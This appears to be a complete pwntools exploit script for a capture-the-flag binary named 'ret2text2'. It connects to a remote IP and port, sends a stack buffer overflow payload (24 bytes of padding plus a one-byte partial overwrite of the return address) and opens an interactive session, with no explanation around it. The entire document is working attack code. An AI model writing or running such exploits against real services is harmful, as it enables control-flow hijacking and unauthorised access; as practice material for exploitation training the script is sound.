from pwn import *

r=remote("118.178.181.26",4002)

#r=process("./ret2text2")

#gdb.attach(r)

r.recvuntil("n")

payload=(0x10+0x8)*"a"+'\x79'

r.send(payload)

r.interactive()


